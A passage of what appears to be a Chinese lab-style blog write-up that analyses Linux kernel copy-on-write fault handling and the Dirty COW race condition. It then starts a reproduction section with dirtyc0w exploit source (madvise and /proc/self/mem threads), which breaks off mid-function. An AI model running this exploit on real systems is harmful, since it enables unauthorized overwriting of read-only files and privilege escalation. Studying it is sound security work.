class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_wp_page</span><span class="params">(struct mm_struct *mm, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pte_t</span> *page_table, <span class="keyword">pmd_t</span> *pmd,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">spinlock_t</span> *ptl, <span class="keyword">pte_t</span> orig_pte)</span></span></span><br><span class="line"><span class="function">	__<span class="title">releases</span><span class="params">(ptl)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">old_page</span>;</span></span><br><span class="line"></span><br><span class="line">	old_page = vm_normal_page(vma, address, orig_pte);</span><br><span class="line">	<span class="keyword">if</span> (!old_page) &#123; <span class="comment">/* 当old_page是NULL时 */</span></span><br><span class="line">		<span class="keyword">if</span> ((vma-&gt;vm_flags &amp; (VM_WRITE|VM_SHARED)) ==</span><br><span class="line">				     (VM_WRITE|VM_SHARED))</span><br><span class="line">			<span class="keyword">return</span> wp_pfn_shared(mm, vma, address, page_table, ptl,</span><br><span class="line">					     orig_pte, pmd);</span><br><span class="line"></span><br><span class="line">		pte_unmap_unlock(page_table, ptl);</span><br><span class="line">		<span class="keyword">return</span> wp_page_copy(mm, vma, address, page_table, pmd,</span><br><span class="line">				    orig_pte, old_page);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (PageAnon(old_page) &amp;&amp; !PageKsm(old_page)) &#123; <span class="comment">/* 先处理匿名页面 */</span></span><br><span class="line">		<span class="keyword">if</span> (!trylock_page(old_page)) &#123;</span><br><span class="line">			page_cache_get(old_page);</span><br><span class="line">			pte_unmap_unlock(page_table, ptl);</span><br><span class="line">			lock_page(old_page);</span><br><span class="line">			page_table = pte_offset_map_lock(mm, pmd, address,</span><br><span class="line">							 &amp;ptl);</span><br><span class="line">			<span class="keyword">if</span> (!pte_same(*page_table, orig_pte)) &#123;</span><br><span class="line">				unlock_page(old_page);</span><br><span class="line">				pte_unmap_unlock(page_table, ptl);</span><br><span class="line">				page_cache_release(old_page);</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			page_cache_release(old_page);</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="comment">/* 调用reuse_swap_page判断使用该页的是否只有一个进程,若是的话就直接重用该页 */</span></span><br><span class="line">		<span class="keyword">if</span> (reuse_swap_page(old_page)) &#123;</span><br><span class="line">			page_move_anon_rmap(old_page, vma, address);</span><br><span class="line">			unlock_page(old_page);</span><br><span class="line">			<span class="keyword">return</span> wp_page_reuse(mm, vma, address, page_table, ptl,</span><br><span class="line">					     orig_pte, old_page, <span class="number">0</span>, <span class="number">0</span>); <span class="comment">/* 一般的cow流程会走到这里,重用由do_cow_fault分配好的内存页副本 */</span></span><br><span class="line">		&#125;</span><br><span class="line">		unlock_page(old_page);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (unlikely((vma-&gt;vm_flags &amp; (VM_WRITE|VM_SHARED)) ==</span><br><span class="line">					(VM_WRITE|VM_SHARED))) &#123;</span><br><span class="line">		<span class="keyword">return</span> wp_page_shared(mm, vma, address, page_table, pmd,</span><br><span class="line">				      ptl, orig_pte, old_page);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	page_cache_get(old_page);</span><br><span class="line"></span><br><span class="line">	pte_unmap_unlock(page_table, ptl);</span><br><span class="line">	<span class="keyword">return</span> wp_page_copy(mm, vma, address, page_table, pmd,</span><br><span class="line">			    orig_pte, old_page);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>do_cow_fault</code>：缺页的 COW 处理函数</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_cow_fault</span><span class="params">(struct mm_struct *mm, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pmd_t</span> *pmd,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">pgoff_t</span> pgoff, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">pte_t</span> orig_pte)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">fault_page</span>, *<span class="title">new_page</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mem_cgroup</span> *<span class="title">memcg</span>;</span></span><br><span class="line">	<span class="keyword">spinlock_t</span> *ptl;</span><br><span class="line">	<span class="keyword">pte_t</span> *pte;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(anon_vma_prepare(vma)))</span><br><span class="line">		<span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line"></span><br><span class="line">	new_page = alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, address); <span class="comment">/* 分配新物理页 */</span></span><br><span class="line">	<span class="keyword">if</span> (!new_page)</span><br><span class="line">		<span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (mem_cgroup_try_charge(new_page, mm, GFP_KERNEL, &amp;memcg)) &#123;</span><br><span class="line">		page_cache_release(new_page);</span><br><span class="line">		<span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ret = __do_fault(vma, address, pgoff, flags, new_page, &amp;fault_page); <span class="comment">/* 查找原始映射页 */</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))</span><br><span class="line">		<span class="keyword">goto</span> uncharge_out;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (fault_page)</span><br><span class="line">		copy_user_highpage(new_page, fault_page, address, vma); <span class="comment">/* 拷贝fault_page内容到new_page */</span></span><br><span class="line">	__SetPageUptodate(new_page);</span><br><span class="line"></span><br><span class="line">	pte = pte_offset_map_lock(mm, pmd, address, &amp;ptl);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!pte_same(*pte, orig_pte))) &#123;</span><br><span class="line">		pte_unmap_unlock(pte, ptl);</span><br><span class="line">		<span class="keyword">if</span> (fault_page) &#123;</span><br><span class="line">			unlock_page(fault_page);</span><br><span class="line">			page_cache_release(fault_page);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			i_mmap_unlock_read(vma-&gt;vm_file-&gt;f_mapping);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">goto</span> uncharge_out;</span><br><span class="line">	&#125;</span><br><span class="line">	do_set_pte(vma, address, new_page, pte, <span class="literal">true</span>, <span class="literal">true</span>); <span class="comment">/* 设置pte表项  */</span></span><br><span class="line">	mem_cgroup_commit_charge(new_page, memcg, <span class="literal">false</span>);</span><br><span class="line">	lru_cache_add_active_or_unevictable(new_page, vma);</span><br><span class="line">	pte_unmap_unlock(pte, ptl);</span><br><span class="line">	<span class="keyword">if</span> (fault_page) &#123;</span><br><span class="line">		unlock_page(fault_page);</span><br><span class="line">		page_cache_release(fault_page);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		i_mmap_unlock_read(vma-&gt;vm_file-&gt;f_mapping);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">uncharge_out:</span><br><span class="line">	mem_cgroup_cancel_charge(new_page, memcg);</span><br><span class="line">	page_cache_release(new_page);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>wp_page_reuse</code>：重用由 <code>do_cow_fault</code> 分配好的内存页副本</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">wp_page_reuse</span><span class="params">(struct mm_struct *mm,</span></span></span><br><span class="line"><span class="params"><span class="function">			struct vm_area_struct *vma, <span class="keyword">unsigned</span> <span class="keyword">long</span> address,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">pte_t</span> *page_table, <span class="keyword">spinlock_t</span> *ptl, <span class="keyword">pte_t</span> orig_pte,</span></span></span><br><span class="line"><span class="params"><span class="function">			struct page *page, <span class="keyword">int</span> page_mkwrite,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">int</span> dirty_shared)</span></span></span><br><span class="line"><span class="function">	__<span class="title">releases</span><span class="params">(ptl)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">pte_t</span> entry;</span><br><span class="line">	<span class="keyword">if</span> (page)</span><br><span class="line">		page_cpupid_xchg_last(page, (<span class="number">1</span> &lt;&lt; LAST_CPUPID_SHIFT) - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	flush_cache_page(vma, address, pte_pfn(orig_pte));</span><br><span class="line">	entry = pte_mkyoung(orig_pte);</span><br><span class="line">    <span class="comment">/* 设置pte的dirty位,如果VMA是可写的,还会给pte标记可写 */</span></span><br><span class="line">	entry = maybe_mkwrite(pte_mkdirty(entry), vma);</span><br><span class="line">	<span class="keyword">if</span> (ptep_set_access_flags(vma, address, page_table, entry, <span class="number">1</span>))</span><br><span class="line">		update_mmu_cache(vma, address, page_table);</span><br><span class="line">	pte_unmap_unlock(page_table, ptl);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (dirty_shared) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">mapping</span>;</span></span><br><span class="line">		<span class="keyword">int</span> dirtied;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!page_mkwrite)</span><br><span class="line">			lock_page(page);</span><br><span class="line"></span><br><span class="line">		dirtied = set_page_dirty(page);</span><br><span class="line">		VM_BUG_ON_PAGE(PageAnon(page), page);</span><br><span class="line">		mapping = page-&gt;mapping;</span><br><span class="line">		unlock_page(page);</span><br><span class="line">		page_cache_release(page);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ((dirtied || page_mkwrite) &amp;&amp; mapping) &#123;</span><br><span class="line">			balance_dirty_pages_ratelimited(mapping);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!page_mkwrite)</span><br><span class="line">			file_update_time(vma-&gt;vm_file);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> VM_FAULT_WRITE; <span class="comment">/* 这个标志表示已经做好了COW,这个页面可以写入 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接下来就重点分析一下 <code>write</code> 函数写入 VMA 对应地址的过程：</p>
<ul>
<li>前面分析到，程序执行 <code>mmap</code> 生成 VMA 结构体是只读的，并且没有设置页表项</li>
<li>接下来 <code>write</code> 的调用链如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys_write -&gt; ... -&gt; mem_rw -&gt; ... -&gt; copy_to_user -&gt; __get_user_pages</span><br></pre></td></tr></table></figure>
<ul>
<li>这里我们只需要关注最后一个函数 <code>__get_user_pages</code>：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> __get_user_pages(struct task_struct *tsk, struct mm_struct *mm,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span> start, <span class="keyword">unsigned</span> <span class="keyword">long</span> nr_pages,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> gup_flags, struct page **pages,</span><br><span class="line">		struct vm_area_struct **vmas, <span class="keyword">int</span> *nonblocking)</span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">retry:</span><br><span class="line">		<span class="keyword">if</span> (unlikely(fatal_signal_pending(current)))</span><br><span class="line">			<span class="keyword">return</span> i ? i : -ERESTARTSYS;</span><br><span class="line">		cond_resched(); <span class="comment">/* 主动让出cpu资源,防止其在内核态执行时间过长导致可能发生的soft lockup或者造成较大的调度延迟 */</span></span><br><span class="line">		page = follow_page_mask(vma, start, foll_flags, &amp;page_mask); <span class="comment">/* 获取page */</span></span><br><span class="line">		<span class="keyword">if</span> (!page) &#123;</span><br><span class="line">			<span class="keyword">int</span> ret;</span><br><span class="line">			ret = faultin_page(tsk, vma, start, &amp;foll_flags,</span><br><span class="line">					nonblocking); <span class="comment">/* 处理page_fault */</span></span><br><span class="line">			<span class="keyword">switch</span> (ret) &#123; <span class="comment">/* 对返回值进行处理 */</span></span><br><span class="line">			<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">				<span class="keyword">goto</span> retry;</span><br><span class="line">			<span class="keyword">case</span> -EFAULT:</span><br><span class="line">			<span class="keyword">case</span> -ENOMEM:</span><br><span class="line">			<span class="keyword">case</span> -EHWPOISON:</span><br><span class="line">				<span class="keyword">return</span> i ? i : ret;</span><br><span class="line">			<span class="keyword">case</span> -EBUSY:</span><br><span class="line">				<span class="keyword">return</span> i;</span><br><span class="line">			<span class="keyword">case</span> -ENOENT:</span><br><span class="line">				<span class="keyword">goto</span> next_page;</span><br><span class="line">			&#125;</span><br><span class="line">			BUG();</span><br><span class="line">		&#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__get_user_pages);</span><br></pre></td></tr></table></figure>
<ul>
<li>如果页面 page 不存在则会调用 <code>faultin_page</code> 处理异常页：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">faultin_page</span><span class="params">(struct task_struct *tsk, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">unsigned</span> <span class="keyword">int</span> *flags, <span class="keyword">int</span> *nonblocking)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">        </span><br><span class="line">	<span class="keyword">if</span> (*flags &amp; FOLL_WRITE)</span><br><span class="line">		fault_flags |= FAULT_FLAG_WRITE;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line">        </span><br><span class="line">	ret = handle_mm_fault(mm, vma, address, fault_flags); <span class="comment">/* 为发生page_fault的地址分配各级页表目录 */</span></span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">/* 为了结束上层函数的retry循环,解决page_fault,在确定已经完成COW操作后(通过VM_FAULT_WRITE标志确定),会解除FOLL_WRITE(写请求)标志 */</span></span><br><span class="line">	<span class="keyword">if</span> ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))</span><br><span class="line">		*flags &amp;= ~FOLL_WRITE;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>设置完标志 <code>flag</code> 后，进入 <code>handle_mm_fault</code>，分配各级页表项</li>
</ul>
<p>第一次处理 <code>page_fault</code> 的流程如下：</p>
<ul>
<li>用户态函数 <code>write</code> 执行到内核中的 <code>__get_user_pages</code> 时，会因为 <code>mmap</code> 没有为 VMA 设置页表而调用 <code>faultin_page</code> 来处理 <code>page_fault</code></li>
<li>然后依次调用 <code>handle_mm_fault</code> 和 <code>handle_pte_fault</code></li>
<li>此时 <code>pte</code> 索引的物理地址不存在，<code>pte</code> 中的内容为空（没有设置页表项），VMA 地址是非匿名映射，所以会调用 <code>do_fault</code> </li>
<li>由于触发 <code>page_fault</code> 的原因为 <code>write</code> 函数的“写缺页”，因此会调用 <code>do_cow_fault</code> 进行写时复制：分配一个新页面作为文件映射内存的副本页（只读），并建立 COW 页的页表项</li>
<li>跳转回到 <code>retry</code></li>
</ul>
<p>第二次处理 <code>page_fault</code> 的流程如下：</p>
<ul>
<li>程序第二次执行 <code>follow_page_mask</code> 时因为分配了属性为不可写的 COW 页而，从而继续调用 <code>faultin_page</code> 来处理 <code>page_fault</code></li>
<li>然后依次调用 <code>handle_mm_fault</code> 和 <code>handle_pte_fault</code></li>
<li>此时 <code>pte</code> 所指向的物理地址存在（COW 分配了页表），对应的 COW 页不可写，因此程序会调用 <code>do_wp_page</code> 进行写时复制</li>
<li>由于第一次 <code>faultin_page</code> 执行 <code>do_cow_fault</code> 时已经分配了副本页，因此会直接调用 <code>wp_page_reuse</code> 重用这个页（COW 分配的页面属于匿名页），并返回 VM_FAULT_WRITE</li>
<li>返回到 <code>faultin_page</code> 中时，由于返回了 VM_FAULT_WRITE 标志，表示已经完成了 COW 页的分配，但是注意到此时 COW 页时只读的，如果我们再次进入 <code>follow_page_mask</code>，那么写和只读会冲突，又会返回 NULL，这样就会陷入 <code>retry</code> 的循环</li>
<li>Linux 为了防止该冲突，选择在 <code>faultin_page</code> 函数的最后，检查 <code>VM_FAULT_WRITE</code> 标志以确定完成了 COW 操作，然后去掉了 COW 页的 <code>FOLL_WRITE</code> 标志使其可以写入</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))</span><br><span class="line">	*flags &amp;= ~FOLL_WRITE;</span><br></pre></td></tr></table></figure>
<ul>
<li>跳转回到 <code>retry</code></li>
</ul>
<p>第三次处理 <code>page_fault</code> 的正常流程如下：</p>
<ul>
<li>由于之前去掉了 <code>FOLL_WRITE</code> 标志，因此不会检查 <code>PTE</code> 有没有写入权限，因此第三次执行 <code>follow_page_mask</code> 将会返回 COW 页</li>
<li>退出 <code>retry</code> 循环，在 COW 页上执行 <code>write</code> 的剩余工作</li>
</ul>
<p>第三次处理 <code>page_fault</code> 的异常流程如下：（触发 COW）</p>
<ul>
<li>如果我们在第二次 <code>faultin_page</code> 函数去掉 <code>flags</code> 里的 <code>FOLL_WRITE</code> 标志之后，通过竞争条件，执行 <code>madvice</code> 函数清空页表项（在 <code>get_user_page</code> 里有一步 <code>cond_resched</code> 线程调度操作，提供了条件竞争的机会）</li>
<li>线程调度结束，返回 <code>write</code> 线程，又会重新进入 <code>follow_page_mask</code> 然后因为 <code>pte</code> 被清空导致缺页，函数返回 NULL，再次进入 <code>faultin_page</code>，然后会一直运行到 <code>do_fault</code>，此时不再要求写入权限，因此程序就会认为触发页中断的原因是“读缺页”，所以会执行 <code>do_read_fault</code> 函数，建立文件映射页的页表项</li>
<li>注意：此时的可写页为 COW 页，但是该 COW 页的页表项却索引到了文件映射页所在的物理内存地址，操纵该 COW 页其实就相当于直接控制文件映射页</li>
<li>接着从 <code>do_fault</code> 返回到 <code>handle_pte_fault</code> 中，检查到页面可写，从而给页面标记 <code>dirty</code> </li>
<li>随后回到 <code>retry</code></li>
</ul>
<p>第四次处理 <code>page_fault</code> 的流程如下：</p>
<ul>
<li>第四次进入 <code>follow_page_mask</code>，不要求写权限，从而成功返回映射到文件的 COW 页（已经标记为 <code>dirty</code>，表示该页可以写入磁盘）</li>
<li>在文件映射页上执行 <code>write</code> 的剩余工作（此时虽然该映射页只读，但是内核还是可以强制写入，完成越权写操作）</li>
</ul>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_52196579/article/details/126608926?app_version=5.8.1&amp;code=app_1562916241&amp;csdn_share_tail={&quot;type&quot;%3A&quot;blog&quot;%2C&quot;rType&quot;%3A&quot;article&quot;%2C&quot;rId&quot;%3A&quot;126608926&quot;%2C&quot;source&quot;%3A&quot;m0_67072125&quot;}&amp;uLinkId=usr1mkqgl919blen&amp;utm_source=app">脏牛（Dirty COW）漏洞攻击实验(SEED-Lab：Dirty-COW Attack Lab)</a> </p>
<p><strong>Dirty Cow 漏洞复现</strong></p>
<p>1.修改服务器上 flag 文件的值：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="keyword">int</span> f;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line"><span class="keyword">char</span> *name;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">madviseThread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *str;</span><br><span class="line">    str=(<span class="keyword">char</span>*)arg;</span><br><span class="line">    <span class="keyword">int</span> i,c=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">1000000</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        c+=madvise(<span class="built_in">map</span>,<span class="number">100</span>,MADV_DONTNEED); <span class="comment">/* 取消map的映射 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;madvise %d\n&quot;</span>,c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">procselfmemThread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *str;</span><br><span class="line">    str=(<span class="keyword">char</span>*)arg;</span><br><span class="line">    <span class="keyword">int</span> f=open(<span class="string">&quot;/proc/self/mem&quot;</span>,O_RDWR); <span class="comment">/* 打开mem文件 */</span></span><br><span class="line">    <span class="keyword">int</span> i,c=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">1000000</span>;i++) &#123;</span><br><span class="line">        lseek(f,(<span class="keyword">uintptr_t</span>) <span class="built_in">map</span>,SEEK_SET); <span class="comment">/* 偏移到map映射的区域 */</span></span><br><span class="line">        c+=write(f,str,<span class="built_in">strlen</span>(str)); <span class="comment">/* 写入目标字符串 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;procselfmem %d\n&quot;</span>, c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;success!!!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc&lt;<span class="number">3</span>) &#123;</span><br><span class="line">        (<span class="keyword">void</span>)<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s\n&quot;</span>,</span><br><span class="line">                      <span class="string">&quot;usage: dirtyc0w target_file new_content&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>; &#125;</span><br><span class="line">    <span class="keyword">pthread_t</span> pth1,pth2;</span><br><span class="line"></span><br><span class="line">    f=open(argv[<span class="number">1</span>],O_RDONLY); </span><br><span class="line">    fstat(f,&amp;st);</span><br><span class="line">    name=argv[<span class="number">1</span>];</span><br><span class="line">    <span 